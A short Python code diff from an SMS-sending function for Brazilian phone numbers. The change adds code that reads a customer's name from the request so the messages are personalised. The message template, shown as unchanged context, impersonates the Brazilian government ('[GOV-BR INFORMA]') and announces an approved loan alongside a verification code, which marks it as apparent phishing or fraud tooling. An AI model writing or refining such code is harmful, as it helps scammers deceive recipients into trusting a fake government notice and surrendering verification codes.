@@ -90,7 +90,11 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
             # Format as international number with Brazil code
             international_number = f"55{formatted_phone}"
-
+            
+            # Get name from request data
+            nome = request.form.get('nome', '') or request.args.get('nome', '')
+            first_name = nome.split()[0] if nome else "Cliente"
+            
             # Message template
             message = f"[GOV-BR INFORMA]: {first_name}, seu emprestimo foi aprovado. Seu código de verificação é: {verification_code}."
 
